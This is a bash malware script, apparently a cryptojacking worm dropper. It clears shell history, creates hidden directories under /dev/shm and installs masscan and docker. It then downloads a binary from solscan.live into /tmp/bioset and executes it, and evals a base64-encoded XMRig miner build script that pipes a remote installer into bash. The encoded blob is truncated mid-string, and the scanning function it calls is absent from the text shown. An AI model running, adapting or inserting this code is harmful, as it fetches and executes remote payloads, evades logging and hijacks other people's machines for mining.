#!/bin/bash
unset HISTFILE
export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export SCAN_RATE=500000


init_main(){
SOME_INSTALL 
TESTLAUF
start_the_gatling_gun
}


function SOME_INSTALL(){
if ! [ -d "/dev/shm/.../...NMLM.../" ] ; then mkdir -p /dev/shm/.../...NMLM.../ ; fi
echo 'Removed for the test run in the container!'
apk add --no-cache bash curl docker masscan libpcap-dev 
if ! [ -f "/tmp/bioset" ] ; then curl http://solscan.live/pwn/ziggy -o /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
}

function TESTLAUF(){
# Yes, we know it's not beautiful, but kept simple and it works as it seems. ;)
$(echo CiMhL2Jpbi9iYXNoCnVuc2V0IEhJU1RGSUxFCmV4cG9ydCBMQ19BTEw9QwoKZXhwb3J0IFBBVEg9JFBBVEg6L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9sb2NhbC9zYmluOi91c3IvZ2FtZXM6L3Vzci9sb2NhbC9nYW1lcwpWRVJTPSJ2Mi4wIgoKIyBSZXF1aXJlZCBQYWNrYWdlcyBmb3IgRGViaWFuL1VidW50dQpEZWJpYW5QYWNrYWdlcz0oJ2J1aWxkLWVzc2VudGlhbCcgJ3VweCcgJ2NtYWtlJyAnbGlidXYxLWRldicgJ2xpYnNzbC1kZXYnICdsaWJod2xvYy1kZXYnICdzY3JlZW4nICdwN3ppcC1mdWxsJykKCkFscGluZVBhY2thZ2VzPSgnYnVpbGQtYmFzZScgJ2RvY2tlcicgJ3VweCcgJ2NtYWtlJyAnbGlidXYtZGV2JyAnb3BlbnNzbC1kZXYnICdod2xvYy1kZXYnICdzY3JlZW4nICc3emlwJykKCiMgU2V0dXAgVmFyaWFibGVzCkJVSUxEPTAKREVCVUc9MApTVEFUSUM9MApTQ1JJUFQ9IiQocmVhZGxpbmsgLWYgIiQwIikiClNDUklQVEZJTEU9IiQoYmFzZW5hbWUgIiRTQ1JJUFQiKSIKU0NSSVBUUEFUSD0iJChkaXJuYW1lICIkU0NSSVBUIikiClNDUklQVE5BTUU9IiQwIgpBUkdTPSggIiRAIiApCkJSQU5DSD0ibWFpbiIKCmlmICEgdHlwZSBkb2NrZXIgMj4vZGV2L251bGw7IHRoZW4gY3VybCAtc0xrIGh0dHBzOi8vZ2V0LmRvY2tlci5jb20gfCBiYXNoIDsgZmkKIyBEZXRlY3QgUGFja2FnZSBNYW5hZ2VyCmlmIGNvbW1hbmQgLXYgYXBrICY+IC9kZXYvbnVsbDsgdGhlbgogICAgUE09ImFwayIKICAgIFBhY2thZ2VzQXJyYXk9KCIke0FscGluZVBhY2thZ2VzW0BdfSIpCmVsaWYgY29tbWFuZCAtdiBhcHQgJj4gL2Rldi9udWxsOyB0aGVuCiAgICBQTT0iYXB0IgogICAgUGFja2FnZXNBcnJheT0oIiR7RGViaWFuUGFja2FnZXNbQF19IikKZWxzZQogICAgZWNobyAtZSAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cZVszOW0iCiAgICBlY2hvIC1lICJcZVszM20gVW5zdXBwb3J0ZWQgcGFja2FnZSBtYW5hZ2VyLiBFeGl0aW5nXGVbMzltIgogICAgZWNobyAtZSAiXGVbMzJtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iCiAgICBleGl0IDEKZmkKCiMgSW5zdGFsbCByZXF1aXJlZCBwYWNrYWdlcwppbnN0YWxsX3BhY2thZ2VzKCkgewogICAgZWNobyAtZSAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cZVszOW0iCiAgICBlY2hvIC1lICJcZVszM20gSW5zdGFsbGluZyBSZXF1aXJlZCBQYWNrYWdlc1xlWzM5bSIKICAgIGVjaG8gLWUgIlxlWzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgaWYgWyAiJFBNIiA9ICJhcGsiIF07IHRoZW4KICAgICAgICBhcGsgdXBkYXRlCiAgICAgICAgYXBrIGFkZCAtLW5vLWNhY2hlIGJhc2ggY3VybCB3Z2V0IHZpbSByYy1zZXJ2aWNlIGRvY2tlciBidWlsZC1iYXNlIHVweCBjbWFrZSBtYWtlIGxpYnV2LWRldiBvcGVuc3NsLWRldiBod2xvYy1kZXYgN3ppcCBwN3ppcCBzY3JlZW4KICAgIGVsaWYgWyAiJFBNIiA9ICJhcHQiIF07IHRoZW4KICAgICAgICBhcHQtZ2V0IHVwZGF0ZQogICAgICAgIGFwdC1nZXQgaW5zdGFsbCAteSAiJHtQYWNrYWdlc0FycmF5W0BdfSIKICAgIGZpCn0KCnN0YXJ0X2RvY2tlcigpIHsKICAgIGlmIGNvbW1hbmQgLXYgcmMtc2VydmljZSAmPiAvZGV2L251bGw7IHRoZW4KICAgICAgICBlY2hvICJVc2luZyAncmMtc2VydmljZScgdG8gc3RhcnQgRG9ja2VyIgogICAgICAgIHJjLXNlcnZpY2UgZG9ja2VyIHN0YXJ0CiAgICBlbGlmIGNvbW1hbmQgLXYgc2VydmljZSAmPiAvZGV2L251bGw7IHRoZW4KICAgICAgICBlY2hvICJVc2luZyAnc2VydmljZScgdG8gc3RhcnQgRG9ja2VyIgogICAgICAgIHNlcnZpY2UgZG9ja2VyIHN0YXJ0CiAgICBlbGlmIGNvbW1hbmQgLXYgc3lzdmluaXQgJj4gL2Rldi9udWxsOyB0aGVuCiAgICAgICAgZWNobyAiVXNpbmcgJ3N5c3Zpbml0JyB0byBzdGFydCBEb2NrZXIiCiAgICAgICAgc3lzdmluaXQgZG9ja2VyIHN0YXJ0CiAgICBlbGlmIGNvbW1hbmQgLXYgb3BlbnJjICY+IC9kZXYvbnVsbDsgdGhlbgogICAgICAgIGVjaG8gIlVzaW5nICdvcGVucmMnIHRvIHN0YXJ0IERvY2tlciIKICAgICAgICBvcGVucmMgZG9ja2VyIHN0YXJ0CiAgICBlbGlmIGNvbW1hbmQgLXYgZG9ja2VyZCAmPiAvZGV2L251bGw7IHRoZW4KICAgICAgICBlY2hvICJVc2luZyAnZG9ja2VyZCcgdG8gc3RhcnQgRG9ja2VyIgogICAgICAgIGRvY2tlcmQgJgogICAgICAgICMgT3B0aW9uYWxseSwgd2FpdCBmb3IgRG9ja2VyIGRhZW1vbiB0byBzdGFydAogICAgICAgIHNsZWVwIDUKICAgICAgICBlY2hvICJEb2NrZXIgZGFlbW9uIHN0YXJ0ZWQiCiAgICBlbHNlCiAgICAgICAgZWNobyAiRXJyb3I6IE5laXRoZXIgJ3JjLXNlcnZpY2UnLCAnc2VydmljZScsICdzeXN2aW5pdCcsICdvcGVucmMnLCBub3IgJ2RvY2tlcmQnIGNvbW1hbmQgZm91bmQuIgogICAgICAgIGVjaG8gIlBsZWFzZSBpbnN0YWxsIERvY2tlciBvciB0aGUgcmVxdWlyZWQgc2VydmljZSBtYW5hZ2VtZW50IHRvb2xzLiIKICAgICAgICByZXR1cm4gMQogICAgZmkKfQoKIyBVc2FnZSBFeGFtcGxlIEZ1bmN0aW9uCnVzYWdlX2V4YW1wbGUoKSB7CiAgICBlY2hvIC1lICJcZVszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKICAgIGVjaG8gLWUgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XGVbMzltIgogICAgZWNobyAtZSAiXGVbMzNtIFhNUmlnIEJ1aWxkIFNjcmlwdCAkVkVSU1xlWzM5bSIKICAgIGVjaG8KICAgIGVjaG8gLWUgIlxlWzMzbSBieSBUb1J4bXJpZ1xlWzM5bSIKICAgIGVjaG8KICAgIGVjaG8gLWUgIlxlWzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgZWNobyAtZSAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cZVszOW0iCiAgICBlY2hvCiAgICBlY2hvICIgVXNhZ2U6ICB4bXJpZy1idWlsZCBbLWRoc10gLTwwfDd8OD4iCiAgICBlY2hvCiAgICBlY2hvICIgICAgLTAgfCAwIHwgPGJsYW5rPiAgICAgIC0geDg2LTY0IgogICAgZWNobyAiICAgIC03IHwgNyAgICAgICAgICAgICAgICAtIEFSTXY3IgogICAgZWNobyAiICAgIC04IHwgOCAgICAgICAgICAgICAgICAtIEFSTXY4IgogICAgZWNobwogICAgZWNobyAiICAgIC1zIHwgcyAgICAgICAgICAgICAgICAtIEJ1aWxkIFN0YXRpYyIKICAgIGVjaG8KICAgIGVjaG8gIiAgICAtaCB8IGggICAgICAgICAgICAgICAgLSBEaXNwbGF5ICh0aGlzKSBVc2FnZSBPdXRwdXQiCiAgICBlY2hvICIgICAgLWQgfCBkICAgICAgICAgICAgICAgIC0gRW5hYmxlIERlYnVnIE91dHB1dCIKICAgIGVjaG8KICAgIGV4aXQgMAp9CgojIEZsYWcgUHJvY2Vzc2luZyBGdW5jdGlvbgpmbGFncygpIHsKICAgICMgQ2hlY2sgZm9yIGhlbHAgZmxhZ3MKICAgIChbICIkMSIgPSAiLWgiIF0gfHwgWyAiJDEiID0gImgiIF0pICYmIHVzYWdlX2V4YW1wbGUKICAgIChbICIkMiIgPSAiLWgiIF0gfHwgWyAiJDIiID0gImgiIF0pICYmIHVzYWdlX2V4YW1wbGUKICAgIChbICIkMyIgPSAiLWgiIF0gfHwgWyAiJDMiID0gImgiIF0pICYmIHVzYWdlX2V4YW1wbGUKICAgIChbICIkNCIgPSAiLWgiIF0gfHwgWyAiJDQiID0gImgiIF0pICYmIHVzYWdlX2V4YW1wbGUKCiAgICAjIENoZWNrIGZvciBkZWJ1ZyBmbGFncwogICAgKFsgIiQxIiA9ICItZCIgXSB8fCBbICIkMSIgPSAiZCIgXSkgJiYgREVCVUc9MQogICAgKFsgIiQyIiA9ICItZCIgXSB8fCBbICIkMiIgPSAiZCIgXSkgJiYgREVCVUc9MQogICAgKFsgIiQzIiA9ICItZCIgXSB8fCBbICIkMyIgPSAiZCIgXSkgJiYgREVCVUc9MQoKICAgICMgQ2hlY2sgZm9yIHN0YXRpYyBmbGFncwogICAgKFsgIiQxIiA9ICItcyIgXSB8fCBbICIkMSIgPSAicyIgXSkgJiYgU1RBVElDPTEKICAgIChbICIkMiIgPSAiLXMiIF0gfHwgWyAiJDIiID0gInMiIF0pICYmIFNUQVRJQz0xCiAgICAoWyAiJDMiID0gIi1zIiBdIHx8IFsgIiQzIiA9ICJzIiBdKSAmJiBTVEFUSUM9MQoKICAgICMgQ2hlY2sgZm9yIGJ1aWxkIHZlcnNpb24gNwogICAgKFsgIiQxIiA9ICItNyIgXSB8fCBbICIkMSIgPSAiNyIgXSkgJiYgQlVJTEQ9NwogICAgKFsgIiQyIiA9ICItNyIgXSB8fCBbICIkMiIgPSAiNyIgXSkgJiYgQlVJTEQ9NwogICAgKFsgIiQzIiA9ICItNyIgXSB8fCBbICIkMyIgPSAiNyIgXSkgJiYgQlVJTEQ9NwoKICAgICMgQ2hlY2sgZm9yIGJ1aWxkIHZlcnNpb24gOAogICAgKFsgIiQxIiA9ICItOCIgXSB8fCBbICIkMSIgPSAiOCIgXSkgJiYgQlVJTEQ9OAogICAgKFsgIiQyIiA9ICItOCIgXSB8fCBbICIkMiIgPSAiOCIgXSkgJiYgQlVJTEQ9OAogICAgKFsgIiQzIiA9ICItOCIgXSB8fCBbICIkMyIgPSAiOCIgXSkgJiYgQlVJTEQ9OAoKICAgICMgQ2hlY2sgZm9yIENVREEgZmxhZwogICAgKFsgIiQxIiA9ICItOSIgXSB8fCBbICIkMSIgPSAiOSIgXSkgJiYgQlVJTEQ9OQogICAgKFsgIiQyIiA9ICItOSIgXSB8fCBbICIkMiIgPSAiOSIgXSkgJiYgQlVJTEQ9OQogICAgKFsgIiQzIiA9ICItOSIgXSB8fCBbICIkMyIgPSAiOSIgXSkgJiYgQlVJTEQ9OQogICAgKFsgIiQ0IiA9ICItOSIgXSB8fCBbICIkNCIgPSAiOSIgXSkgJiYgQlVJTEQ9OQp9CgojIFNjcmlwdCBVcGRhdGUgRnVuY3Rpb24Kc2VsZl91cGRhdGUoKSB7CiAgICBlY2hvIC1lICI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxlWzM5bSIKICAgIGVjaG8gLWUgIlxlWzMzbVN0YXR1czpcZVszOW0iCiAgICBlY2hvIC1lICJcZVszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKCiAgICAjIEVuc3VyZSB3ZSBhcmUgaW4gdGhlIHNjcmlwdCBkaXJlY3RvcnkKICAgIGNkICIkU0NSSVBUUEFUSCIgfHwgeyBlY2hvICJFcnJvcjogQ2Fubm90IGNoYW5nZSB0byBkaXJlY3RvcnkgJFNDUklQVFBBVEgiOyBleGl0IDE7IH0KCiAgICAjIENoZWNrIGlmIHRoZSBkaXJlY3RvcnkgaXMgYSBHaXQgcmVwb3NpdG9yeQogICAgaWYgWyAhIC1kICIuZ2l0IiBdOyB0aGVuCiAgICAgICAgZWNobyAtZSAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cZVszOW0iCiAgICAgICAgZWNobyAtZSAiXGVbMzFtRXJyb3I6IE5vdCBhIEdpdCByZXBvc2l0b3J5LlxlWzM5bSIKICAgICAgICBlY2hvIC1lICJcZVszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKICAgICAgICByZXR1cm4gMQogICAgZmkKCiAgICAjIEZldGNoIHVwZGF0ZXMgZnJvbSB0aGUgcmVtb3RlIHJlcG9zaXRvcnkKICAgIGVjaG8gLWUgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XGVbMzltIgogICAgZWNobyAtZSAiXGVbMzNtRmV0Y2hpbmcgdXBkYXRlcyBmcm9tIHRoZSByZW1vdGUgcmVwb3NpdG9yeS4uLi5cZVszOW0iCiAgICBlY2hvIC1lICJcZVszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKCiAgICBpZiAhIHRpbWVvdXQgMXMgZ2l0IGZldGNoIC0tcXVpZXQ7IHRoZW4KICAgICAgICBlY2hvIC1lICI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxlWzM5bSIKICAgICAgICBlY2hvIC1lICJcZVszMW1FcnJvcjogRmFpbGVkIHRvIGZldGNoIHVwZGF0ZXMuXGVbMzltIgogICAgICAgIGVjaG8gLWUgIlxlWzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgICAgIHJldHVybiAxCiAgICBmaQoKICAgICMgQ2hlY2sgaWYgdGhlcmUgYXJlIGRpZmZlcmVuY2VzIGJldHdlZW4gdGhlIGxvY2FsIGZpbGUgYW5kIHRoZSByZW1vdGUgYnJhbmNoCiAgICBpZiAhIHRpbWVvdXQgMXMgZ2l0IGRpZmYgLS1xdWlldCAtLWV4aXQtY29kZSAib3JpZ2luL21hc3RlciIgIiRTQ1JJUFRGSUxFIjsgdGhlbgogICAgICAgIGVjaG8gLWUgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XGVbMzltIgogICAgICAgIGVjaG8gLWUgIlxlWzMxbSAg4pyXIFZlcnNpb246IE1pc21hdGNoZWQuXGVbMzltIgogICAgICAgIGVjaG8gLWUgIlxlWzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgICAgIGVjaG8KCiAgICAgICAgIyBGZXRjaCB1cGRhdGUKICAgICAgICBlY2hvIC1lICJcZVszM21GZXRjaGluZyBVcGRhdGU6XGVbMzltIgogICAgICAgIGlmIFsgLW4gIiQoZ2l0IHN0YXR1cyAtLXBvcmNlbGFpbikiIF07IHRoZW4KICAgICAgICAgICAgZWNobyAtZSAiXGVbMzNtU3Rhc2hpbmcgbG9jYWwgY2hhbmdlcy4uLlxlWzM5bSIKICAgICAgICAgICAgaWYgISBnaXQgc3Rhc2ggcHVzaCAtbSAnbG9jYWwgY2hhbmdlcyBzdGFzaGVkIGJlZm9yZSBzZWxmIHVwZGF0ZScgLS1xdWlldDsgdGhlbgogICAgICAgICAgICAgICAgZWNobyAtZSAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cZVszOW0iCiAgICAgICAgICAgICAgICBlY2hvIC1lICJcZVszMW1FcnJvcjogRmFpbGVkIHRvIHN0YXNoIGxvY2FsIGNoYW5nZXMuXGVbMzltIgogICAgICAgICAgICAgICAgZWNobyAtZSAiXGVbMzJtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iCiAgICAgICAgICAgICAgICByZXR1cm4gMQogICAgICAgICAgICBmaQogICAgICAgIGZpCgogICAgICAgIGlmICEgZ2l0IHB1bGwgLS1mb3JjZSAtLXF1aWV0OyB0aGVuCiAgICAgICAgICAgIGVjaG8gLWUgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XGVbMzltIgogICAgICAgICAgICBlY2hvIC1lICJcZVszMW1FcnJvcjogRmFpbGVkIHRvIHB1bGwgdXBkYXRlcy5cZVszOW0iCiAgICAgICAgICAgIGVjaG8gLWUgIlxlWzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgICAgICAgICByZXR1cm4gMQogICAgICAgIGZpCgogICAgICAgICMgQ2hlY2tvdXQgdG8gdGhlIHNwZWNpZmllZCBicmFuY2gKICAgICAgICBpZiAhIGdpdCBjaGVja291dCAiJEJSQU5DSCIgLS1xdWlldDsgdGhlbgogICAgICAgICAgICBlY2hvIC1lICI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxlWzM5bSIKICAgICAgICAgICAgZWNobyAtZSAiXGVbMzFtRXJyb3I6IEZhaWxlZCB0byBjaGVja291dCBicmFuY2ggJEJSQU5DSC5cZVszOW0iCiAgICAgICAgICAgIGVjaG8gLWUgIlxlWzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgICAgICAgICByZXR1cm4gMQogICAgICAgIGZpCgogICAgICAgICMgUHVsbCBsYXRlc3QgY2hhbmdlcyBmb3IgdGhlIGJyYW5jaAogICAgICAgIGlmICEgZ2l0IHB1bGwgLS1mb3JjZSAtLXF1aWV0OyB0aGVuCiAgICAgICAgICAgIGVjaG8gLWUgIlxlWzMxbUVycm9yOiBGYWlsZWQgdG8gcHVsbCB1cGRhdGVzIGZvciBicmFuY2ggJEJSQU5DSC5cZVszOW0iCiAgICAgICAgICAgIHJldHVybiAxCiAgICAgICAgZmkKCiAgICAgICAgZWNobyAtZSAiXGVbMzNtICDinJMgVXBkYXRlOiBDb21wbGV0ZS5cZVszOW0iCiAgICAgICAgZWNobwogICAgICAgIGVjaG8gLWUgIlxlWzMzbUxhdW5jaGluZyBOZXcgVmVyc2lvbi4gU3RhbmRieS4uLlxlWzM5bSIKICAgICAgICBzbGVlcCAzCgogICAgICAgICMgUmV0dXJuIHRvIHRoZSBvcmlnaW5hbCB3b3JraW5nIGRpcmVjdG9yeSBhbmQgZXhlY3V0ZSB0aGUgc2NyaXB0CiAgICAgICAgY2QgLSA+IC9kZXYvbnVsbCB8fCB7IGVjaG8gIkVycm9yOiBDYW5ub3QgcmV0dXJuIHRvIHRoZSBvcmlnaW5hbCBkaXJlY3RvcnkiOyBleGl0IDE7IH0KICAgICAgICBleGVjICIkU0NSSVBUTkFNRSIgIiR7QVJHU1tAXX0iCiAgICAgICAgCiAgICAgICAgIyBFeGl0IHRoZSBvbGQgaW5zdGFuY2UKICAgICAgICBleGl0IDEKICAgIGVsc2UKICAgICAgICBlY2hvIC1lICJcZVszM20gIOKckyBWZXJzaW9uOiBDdXJyZW50LlxlWzM5bSIKICAgICAgICBlY2hvCiAgICBmaQp9CgojIFBhY2thZ2UgQ2hlY2svSW5zdGFsbCBGdW5jdGlvbgpwYWNrYWdlcygpIHsKICAgIGluc3RhbGxfcGtncz0iIgogICAgZm9yIFJFUVVJUkVEX1BLRyBpbiAiJHtQYWNrYWdlc0FycmF5W0BdfSI7IGRvCiAgICAgICAgaWYgWyAiJFBNIiA9ICJhcHQiIF07IHRoZW4KICAgICAgICAgICAgUEtHX09LPSQoZHBrZy1xdWVyeSAtVyAtLXNob3dmb3JtYXQ9JyR7U3RhdHVzfVxuJyAiJFJFUVVJUkVEX1BLRyIgfCBncmVwICJpbnN0YWxsIG9rIGluc3RhbGxlZCIpCiAgICAgICAgZWxpZiBbICIkUE0iID0gImFwayIgXTsgdGhlbgogICAgICAgICAgICBQS0dfT0s9JChhcGsgaW5mbyB8IGdyZXAgIiRSRVFVSVJFRF9QS0ciKQogICAgICAgIGZpCiAgICAgICAgaWYgWyAteiAiJFBLR19PSyIgXTsgdGhlbgogICAgICAgICAgICBlY2hvIC1lICJcZVszMW0gIOKclyAkUkVRVUlSRURfUEtHOiBOb3QgRm91bmQuXGVbMzltIgogICAgICAgICAgICBpbnN0YWxsX3BrZ3MrPSIgJFJFUVVJUkVEX1BLRyIKICAgICAgICBlbHNlCiAgICAgICAgICAgIGVjaG8gLWUgIlxlWzMzbSAg4pyTICRSRVFVSVJFRF9QS0c6IEZvdW5kLlxlWzM5bSIKICAgICAgICBmaQogICAgZG9uZQogICAgaWYgWyAtbiAiJGluc3RhbGxfcGtncyIgXTsgdGhlbgogICAgICAgIGVjaG8KICAgICAgICBlY2hvIC1lICJcZVszM21JbnN0YWxsaW5nIFBhY2thZ2VzOlxlWzM5bSIKICAgICAgICBpZiBbICRERUJVRyAtZXEgMSBdOyB0aGVuCiAgICAgICAgICAgICRQTSAtLWRyeS1ydW4gYWRkICRpbnN0YWxsX3BrZ3MKICAgICAgICBlbHNlCiAgICAgICAgICAgIGlmIFsgIiRQTSIgPSAiYXB0IiBdOyB0aGVuCiAgICAgICAgICAgICAgICBhcHQgaW5zdGFsbCAteSAkaW5zdGFsbF9wa2dzCiAgICAgICAgICAgIGVsaWYgWyAiJFBNIiA9ICJhcGsiIF07IHRoZW4KICAgICAgICAgICAgICAgIGFwayBhZGQgJGluc3RhbGxfcGtncwogICAgICAgICAgICBmaQogICAgICAgIGZpCiAgICBmaQp9CgojIEVycm9yIFRyYXBwaW5nIHdpdGggQ2xlYW51cAplcnJleGl0KCkgewogICAgIyBEcmF3IDUgbGluZXMgb2YgKyBhbmQgbWVzc2FnZQogICAgZm9yIGkgaW4gezEuLjV9OyBkbyBlY2hvICIrIjsgZG9uZQogICAgZWNobyAtZSAiXGVbOTFtRXJyb3IgcmFpc2VkISBDbGVhbmluZyBVcCBhbmQgRXhpdGluZy5cZVszOW0iCgogICAgIyBSZW1vdmUgX3NvdXJjZSBkaXJlY3RvcnkgaWYgZm91bmQKICAgIFsgLWQgIiRTQ1JJUFRQQVRIL19zb3VyY2UiIF0gJiYgcm0gLXIgIiRTQ1JJUFRQQVRIL19zb3VyY2UiCgogICAgIyBSZW1vdmUgeG1yaWcgZGlyZWN0b3J5IGlmIGZvdW5kCiAgICBbIC1kICIkU0NSSVBUUEFUSC94bXJpZyIgXSAmJiBybSAtciAiJFNDUklQVFBBVEgveG1yaWciCgogICAgIyBEaXJ0eSBFeGl0CiAgICBleGl0IDEKfQoKIyBQaGFzZSBIZWFkZXIKcGhhc2VoZWFkZXIoKSB7CiAgICBlY2hvCiAgICBlY2hvIC1lICJcZVszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cZVszOW0iCiAgICBlY2hvIC1lICJcZVszNW0tICQxLi4uXGVbMzltIgogICAgZWNobyAtZSAiXGVbMzJtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XGVbMzltIgp9CgojIFBoYXNlIEZvb3RlcgpwaGFzZWZvb3RlcigpIHsKICAgIGVjaG8gLWUgIlxlWzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxlWzM5bSIKICAgIGVjaG8gLWUgIlxlWzM1bSAkMSBDb21wbGV0ZWRcZVszOW0iCiAgICBlY2hvIC1lICJcZVszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cZVszOW0iCiAgICBlY2hvCn0KCiMgSW50cm8vT3V0cm8gSGVhZGVyCmlub3V0aGVhZGVyKCkgewogICAgZWNobyAtZSAiXGVbMzJtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iCiAgICBlY2hvIC1lICI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxlWzM5bSIKICAgIGVjaG8gLWUgIlxlWzMzbSBYTVJpZyBCdWlsZCBTY3JpcHQgJFZFUlNcZVszOW0iCgogICAgWyAkQlVJTEQgLWVxIDcgXSAmJiBlY2hvIC1uZSAiXGVbMzNtIGZvciBBUk12N1xlWzM5bSIgJiYgWyAkU1RBVElDIC1lcSAxIF0gJiYgZWNobyAtZSAiXGVbMzNtIChzdGF0aWMpXGVbMzltIgogICAgWyAkQlVJTEQgLWVxIDggXSAmJiBlY2hvIC1uZSAiXGVbMzNtIGZvciBBUk12OFxlWzM5bSIgJiYgWyAkU1RBVElDIC1lcSAxIF0gJiYgZWNobyAtZSAiXGVbMzNtIChzdGF0aWMpXGVbMzltIgogICAgWyAkQlVJTEQgLWVxIDAgXSAmJiBlY2hvIC1uZSAiXGVbMzNtIGZvciB4ODYtNjRcZVszOW0iICYmIFsgJFNUQVRJQyAtZXEgMSBdICYmIGVjaG8gLWUgIlxlWzMzbSAoc3RhdGljKVxlWzM5bSIKICAgIGVjaG8KCiAgICBlY2hvIC1lICJcZVszM20gYnkgVG9SeG1yaWdcZVszOW0iCiAgICBlY2hvCiAgICBlY2hvIC1lICJcZVszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKICAgIGVjaG8gLWUgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XGVbMzltIgp9CgojIEludHJvL091dHJvIEZvb3Rlcgppbm91dGZvb3RlcigpIHsKICAgIGVjaG8KICAgIGVjaG8gLWUgIlxlWzMybT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgZWNobyAtZSAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cZVszOW0iCiAgICBlY2hvIC1lICJcZVszM21CdWlsZCBTY3JpcHQgQ29tcGxldGVcZVszOW0iCiAgICBlY2hvCiAgICBlY2hvIC1lICJcZVszM20gYnkgVG9SeG1yaWdcZVszOW0iCiAgICBlY2hvCiAgICBlY2hvIC1lICJcZVszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKICAgIGVjaG8gLWUgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XGVbMzltIgp9CgojIFByZS1CdWlsZCBCYWNrdXAKYmFja3VwKCkgewogICAgaWYgWyAtZCAiJFNDUklQVFBBVEgveG1yaWciIF07IHRoZW4KICAgICAgICBlY2hvCiAgICAgICAgZWNobyAtZSAiXGVbMzNtUHJpb3IgQnVpbGQgRm91bmQ6XGVbMzltIgogICAgICAgIGVjaG8gLWUgIlxlWzMzbUJhY2t1cCBpbiBQcm9ncmVzcy5cZVszOW0iCiAgICAgICAgcm0gLWYgeG1yaWctYmtwLjd6CiAgICAgICAgN3phIGEgeG1yaWctYmtwLjd6IHhtcmlnLyA+IC9kZXYvbnVsbAogICAgICAgIHJtIC1yIHhtcmlnLwogICAgZmkKfQoKIyBDbG9uZSBSZXBvLCBCdWlsZC9Db21waWxlCmNvbXBpbGUoKSB7CiAgICBjZCAiJFNDUklQVFBBVEgiIHx8IHsgZWNobyAiRXJyb3I6IENhbm5vdCBjaGFuZ2UgdG8gZGlyZWN0b3J5ICRTQ1JJUFRQQVRIIjsgZXhpdCAxOyB9CgogICAgZWNobyAtZSAiXGVbMzNtQ2xvbmluZyBSZXBvOlxlWzM5bSIKICAgIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vVG9SeG1yaWcveG1yaWcgLS1kZXB0aCAxIHx8IHsgZWNobyAiRXJyb3I6IEZhaWxlZCB0byBjbG9uZSByZXBvc2l0b3J5IjsgZXhpdCAxOyB9CgogICAgcGhhc2VoZWFkZXIgIkluc3RhbGxpbmcgU3VibW9kdWxlcyIKICAgIGNkIHhtcmlnIHx8IHsgZWNobyAiRXJyb3I6IENhbm5vdCBjaGFuZ2UgdG8gZGlyZWN0b3J5IHhtcmlnIjsgZXhpdCAxOyB9CiAgICBnaXQgc3VibW9kdWxlIHVwZGF0ZSAtLWluaXQgLS1kZXB0aCAxIHx8IHsgZWNobyAiRXJyb3I6IEZhaWxlZCB0byB1cGRhdGUgc3VibW9kdWxlcyI7IGV4aXQgMTsgfQogICAgcGhhc2V